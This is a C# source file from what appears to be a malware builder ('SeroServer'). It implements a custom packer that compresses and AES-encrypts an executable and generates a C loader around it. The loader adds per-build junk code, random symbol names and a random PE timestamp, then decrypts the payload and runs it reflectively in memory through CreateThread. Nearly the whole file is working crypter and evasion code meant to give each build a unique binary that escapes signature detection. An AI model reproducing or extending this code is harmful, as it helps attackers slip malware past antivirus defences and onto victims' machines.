using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace SeroServer.Builder;

/// <summary>
/// Custom packer: LZNT1-compress + AES-256-CBC-encrypt the stub, then wrap it in a
/// randomised C loader (junk dead-code, AES decrypt via BCrypt, LZNT1 decompress,
/// in-memory PE map + CreateThread at entry point — no child process spawned).
/// Each build produces a unique binary: different junk symbols, random AES key/IV,
/// random PE timestamp.
/// </summary>
public static class CustomPackerBuilder
{
    // ── Win32 LZNT1 compression ───────────────────────────────────────────────────

    [DllImport("ntdll.dll")]
    private static extern int RtlGetCompressionWorkSpaceSize(
        ushort CompressionFormatAndEngine,
        out uint CompressBufferWorkSpaceSize,
        out uint CompressFragmentWorkSpaceSize);

    [DllImport("ntdll.dll")]
    private static extern int RtlCompressBuffer(
        ushort CompressionFormatAndEngine,
        byte[] UncompressedBuffer, uint UncompressedBufferSize,
        byte[] CompressedBuffer,   uint CompressedBufferSize,
        uint   UncompressedChunkSize,
        out uint FinalCompressedSize,
        nint WorkSpace);

    private const ushort COMPRESSION_FORMAT_LZNT1   = 2;
    private const ushort COMPRESSION_ENGINE_MAXIMUM = 0x0100;

    private static byte[] Compress(byte[] data, Action<string> log)
    {
        ushort fmt = COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM;
        int st = RtlGetCompressionWorkSpaceSize(fmt, out uint wsSize, out _);
        if (st != 0) throw new InvalidOperationException($"RtlGetCompressionWorkSpaceSize: 0x{st:X}");

        var ws  = Marshal.AllocHGlobal((int)wsSize);
        var dst = new byte[data.Length * 2 + 4096];
        try
        {
            st = RtlCompressBuffer(fmt, data, (uint)data.Length,
                                   dst, (uint)dst.Length, 4096,
                                   out uint finalSize, ws);
            if (st != 0) throw new InvalidOperationException($"RtlCompressBuffer: 0x{st:X}");
            var result = new byte[finalSize];
            Array.Copy(dst, result, (int)finalSize);
            log($"[*] CustomPacker: LZNT1 {data.Length / 1024:N0} KB → {result.Length / 1024:N0} KB ({100.0 * result.Length / data.Length:F0}%)");
            return result;
        }
        finally { Marshal.FreeHGlobal(ws); }
    }

    // ── AES-256-CBC encryption ────────────────────────────────────────────────────

    private static (byte[] cipher, byte[] key, byte[] iv) EncryptAes(byte[] data)
    {
        var key = RandomNumberGenerator.GetBytes(32);
        var iv  = RandomNumberGenerator.GetBytes(16);
        using var aes = Aes.Create();
        aes.Key = key; aes.IV = iv;
        aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
        using var ms  = new MemoryStream();
        using var enc = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write);
        enc.Write(data); enc.FlushFinalBlock();
        return (ms.ToArray(), key, iv);
    }

    // ── Utilities ─────────────────────────────────────────────────────────────────

    private static string ToCArray(byte[] data, string name)
    {
        var sb = new System.Text.StringBuilder();
        sb.Append($"static const unsigned char {name}[] = {{");
        for (int i = 0; i < data.Length; i++)
        {
            if (i % 16 == 0) sb.Append("\n    ");
            sb.Append($"0x{data[i]:X2}");
            if (i < data.Length - 1) sb.Append(',');
        }
        sb.Append($"\n}};\nstatic const unsigned int {name}_len = {data.Length}U;\n");
        return sb.ToString();
    }

    private static string Rnd(string prefix)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyz";
        var buf = RandomNumberGenerator.GetBytes(6);
        return prefix + new string(buf.Select(b => chars[b % chars.Length]).ToArray());
    }

    // ── C loader source ───────────────────────────────────────────────────────────

    private static string GenerateLoaderSource(
        byte[] cipher, byte[] key, byte[] iv,
        uint compressedLen, uint originalLen)
    {
        string fnAes  = Rnd("_a");
        string fnDcmp = Rnd("_b");
        string fnRun  = Rnd("_c");
        string fnJunk = Rnd("_j");
        string varX   = Rnd("x_");
        string varY   = Rnd("y_");
        uint jk1 = RandomNumberGenerator.GetBytes(4).Aggregate(0u, (a, b) => (a << 8) | b);
        uint jk2 = RandomNumberGenerator.GetBytes(4).Aggregate(0u, (a, b) => (a << 8) | b);

        return $$"""
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>
#include <stdint.h>
#include <string.h>
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ntdll.lib")

{{ToCArray(cipher, "g_enc")}}
{{ToCArray(key,    "g_key")}}
{{ToCArray(iv,     "g_iv")}}
static const unsigned int g_cmp_size = {{compressedLen}}U;
static const unsigned int g_org_size = {{originalLen}}U;

/* ── Junk dead-code — different every build ── */
#pragma optimize("", off)
static __declspec(noinline) unsigned int {{fnJunk}}(unsigned int {{varX}}) {
    volatile unsigned int {{varY}} = {{varX}} ^ 0x{{jk1:X8}}U;
    for (int i = 0; i < 4; i++) {{varY}} = ({{varY}} >> 1) | ({{varY}} << 31);
    return {{varY}} ^ 0x{{jk2:X8}}U;
}
#pragma optimize("", on)

/* ── AES-256-CBC decrypt via BCrypt ── */
static unsigned char* {{fnAes}}(const unsigned char* src, unsigned int src_len, unsigned int* out_len) {
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL;
    unsigned char keyObj[1024] = {0}; unsigned char* out = NULL;
    ULONG cbKeyObj = 0, cbData = 0;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) goto done;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObj, sizeof(ULONG), &cbData, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, (cbKeyObj <= sizeof(keyObj)) ? keyObj : NULL, cbKeyObj, (PUCHAR)g_key, g_key_len, 0))) goto done;
    unsigned char iv_copy[16]; memcpy(iv_copy, g_iv, 16);
    ULONG plainLen = 0;
    BCryptDecrypt(hKey, (PUCHAR)src, src_len, NULL, iv_copy, 16, NULL, 0, &plainLen, BCRYPT_BLOCK_PADDING);
    out = (unsigned char*)VirtualAlloc(NULL, plainLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!out) goto done;
    memcpy(iv_copy, g_iv, 16);
    if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PUCHAR)src, src_len, NULL, iv_copy, 16, out, plainLen, &cbData, BCRYPT_BLOCK_PADDING))) {
        VirtualFree(out, 0, MEM_RELEASE); out = NULL;
    } else { *out_len = cbData; }
done:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}

/* ── LZNT1 decompress ── */
typedef NTSTATUS(NTAPI* PFN_DCMP)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, PULONG);
static unsigned char* {{fnDcmp}}(const unsigned char* src, unsigned int src_len, unsigned int out_len) {
    PFN_DCMP fn = (PFN_DCMP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlDecompressBuffer");
    if (!fn) return NULL;
    unsigned char* out = (unsigned char*)VirtualAlloc(NULL, out_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!out) return NULL;
    ULONG final = 0;
    if (fn(0x0002, out, out_len, (PUCHAR)src, src_len, &final) != 0 || final != out_len) {
        VirtualFree(out, 0, MEM_RELEASE); return NULL;
    }
    return out;
}

/* ── In-memory PE loader: map in current process + CreateThread at EP ── */
static int {{fnRun}}(unsigned char* pe, unsigned int pe_len) {
    (void)pe_len;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
    if (dos->e_magic != 0x5A4D) return 0;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    if (nt->Signature != 0x00004550) return 0;

    ULONG_PTR preferred = nt->OptionalHeader.ImageBase;
    DWORD img_size = nt->OptionalHeader.SizeOfImage;

    LPVOID base = VirtualAlloc((LPVOID)preferred, img_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) base = VirtualAlloc(NULL, img_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) return 0;

    ULONG_PTR delta = (ULONG_PTR)base - preferred;

    /* Headers + sections */
    memcpy(base, pe, nt->OptionalHeader.SizeOfHeaders);
    IMAGE_SECTION_HEADER* sec = (IMAGE_SECTION_HEADER*)((UCHAR*)nt + sizeof(IMAGE_NT_HEADERS64));
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++)
        if (sec[i].SizeOfRawData)
            memcpy((UCHAR*)base + sec[i].VirtualAddress, pe + sec[i].PointerToRawData, sec[i].SizeOfRawData);

    /* Relocations */
    if (delta && nt->OptionalHeader.DataDirectory[5].Size) {
        IMAGE_BASE_RELOCATION* rel = (IMAGE_BASE_RELOCATION*)((UCHAR*)base + nt->OptionalHeader.DataDirectory[5].VirtualAddress);
        while (rel->VirtualAddress) {
            WORD* e = (WORD*)((UCHAR*)rel + sizeof(IMAGE_BASE_RELOCATION));
            DWORD n = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            for (DWORD j = 0; j < n; j++) {
                int type = e[j] >> 12; DWORD off = e[j] & 0xFFF;
                if (type == 10)      { ULONG_PTR* p = (ULONG_PTR*)((UCHAR*)base + rel->VirtualAddress + off); *p += delta; }
                else if (type == 3)  { DWORD*     p = (DWORD*)    ((UCHAR*)base + rel->VirtualAddress + off); *p += (DWORD)delta; }
            }
            rel = (IMAGE_BASE_RELOCATION*)((UCHAR*)rel + rel->SizeOfBlock);
        }
    }

    /* IAT */
    if (nt->OptionalHeader.DataDirectory[1].Size) {
        IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)((UCHAR*)base + nt->OptionalHeader.DataDirectory[1].VirtualAddress);
        for (; imp->Name; imp++) {
            HMODULE hMod = LoadLibraryA((LPCSTR)((UCHAR*)base + imp->Name));
            if (!hMod) continue;
            ULONG_PTR* thunk  = (ULONG_PTR*)((UCHAR*)base + (imp->FirstThunk ? imp->FirstThunk : imp->OriginalFirstThunk));
            ULONG_PTR* oThunk = imp->OriginalFirstThunk ? (ULONG_PTR*)((UCHAR*)base + imp->OriginalFirstThunk) : thunk;
            for (; *oThunk; thunk++, oThunk++) {
                FARPROC fn;
                if (*oThunk & IMAGE_ORDINAL_FLAG64) fn = GetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL64(*oThunk));
                else fn = GetProcAddress(hMod, ((IMAGE_IMPORT_BY_NAME*)((UCHAR*)base + *oThunk))->Name);
                if (fn) *thunk = (ULONG_PTR)fn;
            }
        }
    }

    /* Per-section memory protection */
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD ch = sec[i].Characteristics, prot = PAGE_READONLY, old = 0;
        if ((ch & IMAGE_SCN_MEM_EXECUTE) && (ch & IMAGE_SCN_MEM_WRITE)) prot = PAGE_EXECUTE_READWRITE;
        else if (ch & IMAGE_SCN_MEM_EXECUTE) prot = PAGE_EXECUTE_READ;
        else if (ch & IMAGE_SCN_MEM_WRITE)   prot = PAGE_READWRITE;
        DWORD sz = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        VirtualProtect((UCHAR*)base + sec[i].VirtualAddress, sz, prot, &old);
    }

    /* Run in a thread, wait for it */
    ULONG_PTR ep = (ULONG_PTR)base + nt->OptionalHeader.AddressOfEntryPoint;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ep, NULL, 0, NULL);
    if (hThread) { WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); }
    return 1;
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
    (void)h; (void)p; (void)cmd; (void)show;
    /* Touch junk function so the linker keeps it */
    volatile unsigned int _d = {{fnJunk}}(GetCurrentProcessId()); (void)_d;

    unsigned int plainLen = 0;
    unsigned char* compressed = {{fnAes}}(g_enc, g_enc_len, &plainLen);
    if (!compressed) return 1;

    unsigned char* pe = {{fnDcmp}}(compressed, g_cmp_size, g_org_size);
    VirtualFree(compressed, 0, MEM_RELEASE);
    if (!pe) return 1;

    {{fnRun}}(pe, g_org_size);

    VirtualFree(pe, 0, MEM_RELEASE);
    return 0;
}
""";
    }

    // ── Randomise PE timestamp ────────────────────────────────────────────────────

    private static void RandomisePeTimestamp(string exePath)
    {
        try
        {
            var bytes = File.ReadAllBytes(exePath);
            if (bytes.Length < 0x40) return;
            int peOff = BitConverter.ToInt32(bytes, 0x3C);
            if (peOff + 8 > bytes.Length || bytes[peOff] != 'P' || bytes[peOff + 1] != 'E') return;
            BitConverter.GetBytes((uint)Random.Shared.Next()).CopyTo(bytes, peOff + 8);
            File.WriteAllBytes(exePath, bytes);
        }
        catch { }
    }

    // ── Public entry point ────────────────────────────────────────────────────────

    public static async Task ApplyAsync(string exePath, Action<string> log, LoaderMetadata? meta = null)
    {
        log("[*] CustomPacker: Starting...");
        byte[] raw = await File.ReadAllBytesAsync(exePath);
        log($"[*] CustomPacker: Input {raw.Length / 1024:N0} KB");

        byte[] compressed = Compress(raw, log);

        var (cipher, key, iv) = EncryptAes(compressed);
        log($"[*] CustomPacker: AES-256-CBC encrypted ({cipher.Length / 1024:N0} KB)");

        string src = GenerateLoaderSource(cipher, key, iv, (uint)compressed.Length, (uint)raw.Length);

        string? clPath = FindClExe(log);
        if (clPath == null) { log("[!] CustomPacker: cl.exe not found — skipped."); return; }

        var tempDir = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
        Directory.CreateDirectory(tempDir);
        try
        {
            var srcPath = Path.Combine(tempDir, "loader.c");
            var outPath = Path.Combine(tempDir, "loader.exe");
            await File.WriteAllTextAsync(srcPath, src);

            var vsEnv = GetVsEnvironment(clPath);
            var psi   = new System.Diagnostics.ProcessStartInfo
            {
                FileName  = clPath,
                Arguments = $"\"{srcPath}\" /O2 /GS- /MT /W0 /nologo /Fe\"{outPath}\" " +
                            "kernel32.lib bcrypt.lib /link /SUBSYSTEM:WINDOWS /INCREMENTAL:NO /OPT:REF /OPT:ICF",
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute  = false,
                CreateNoWindow   = true,
            };
            if (vsEnv != null) foreach (var kv in vsEnv) psi.Environment[kv.Key] = kv.Value;

            using var proc = System.Diagnostics.Process.Start(psi)!;
            var stdout = await proc.StandardOutput.ReadToEndAsync();
            var stderr = await proc.StandardError.ReadToEndAsync();
            await proc.WaitForExitAsync();

            if (proc.ExitCode != 0 || !File.Exists(outPath))
            {
                log($"[!] CustomPacker: cl.exe failed (exit {proc.ExitCode})");
                if (!string.IsNullOrWhiteSpace(stdout)) log(stdout.TrimEnd());
                if (!string.IsNullOrWhiteSpace(stderr)) log(stderr.TrimEnd());
                return;
            }

            RandomisePeTimestamp(outPath);
            var packedSize = new FileInfo(outPath).Length;
            log($"[+] CustomPacker: {raw.Length / 1024:N0} KB → {packedSize / 1024:N0} KB ({100.0 * packedSize / raw.Length:F0}%)");
            File.Copy(outPath, exePath, overwrite: true);
            log($"[+] CustomPacker: Applied to {Path.GetFileName(exePath)}");
        }
        finally { try { Directory.Delete(tempDir, true); } catch { } }
    }

    // ── cl.exe / VS environment helpers ──────────────────────────────────────────

    private static string? FindClExe(Action<string>? log = null)
    {
        var vswhere = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            "Microsoft Visual Studio", "Installer", "vswhere.exe");

        if (File.Exists(vswhere))
        {
            foreach (var args in new[]
            {
                @"-latest -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -find VC\Tools\MSVC\**\bin\Hostx64\x64\cl.exe",
                @"-latest -prerelease -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -find VC\Tools\MSVC\**\bin\Hostx64\x64\cl.exe",
                @"-all -find VC\Tools\MSVC\**\bin\Hostx64\x64\cl.exe",
            })
            {
                try
                {
                    var psi = new System.Diagnostics.ProcessStartInfo(vswhere, args)
                        { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                    using var p = System.Diagnostics.Process.Start(psi)!;
                    string? line;
                    while ((line = p.StandardOutput.ReadLine()?.Trim()) != null)
                    {
                        p.WaitForExit(5000);
                        if (!string.IsNullOrEmpty(line) && File.Exists(line)) return line;
                    }
                }
                catch { }
            }
        }

        foreach (var pf in new[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
        })
        {
            var vsBase = Path.Combine(pf, "Microsoft Visual Studio");
            if (!Directory.Exists(vsBase)) continue;
            foreach (var verDir in Directory.GetDirectories(vsBase).OrderByDescending(x => x))
                foreach (var ed in Directory.GetDirectories(verDir).OrderByDescending(x => x))
                {
                    var msvc = Path.Combine(ed, "VC", "Tools", "MSVC");
                    if (!Directory.Exists(msvc)) continue;
                    foreach (var v in Directory.GetDirectories(msvc).OrderByDescending(x => x))
                    {
                        var cl = Path.Combine(v, "bin", "Hostx64", "x64", "cl.exe");
                        if (File.Exists(cl)) return cl;
                    }
                }
        }

        log?.Invoke("[!] cl.exe not found. Install VS 2022/2025 with C++ Desktop workload.");
        return null;
    }

    private static Dictionary<string, string>? GetVsEnvironment(string clExePath)
    {
        try
        {
            var dir = Path.GetDirectoryName(clExePath)!;
            for (int i = 0; i < 6; i++)
            {
                dir = Path.GetDirectoryName(dir) ?? "";
                var vcvars = Path.Combine(dir, "Auxiliary", "Build", "vcvarsall.bat");
                if (!File.Exists(vcvars)) continue;
                var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe",
                    $"/c \"\"{vcvars}\" amd64 && set\"")
                {
                    RedirectStandardOutput = true,
                    UseShellExecute  = false,
                    CreateNoWindow   = true,
                };
                using var p = System.Diagnostics.Process.Start(psi)!;
                var env = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
                string? line;
                while ((line = p.StandardOutput.ReadLine()) != null)
                {
                    int eq = line.IndexOf('=');
                    if (eq > 0) env[line[..eq]] = line[(eq + 1)..];
                }
                p.WaitForExit(15000);
                if (env.Count > 0) return env;
            }
        }
        catch { }
        return null;
    }
}
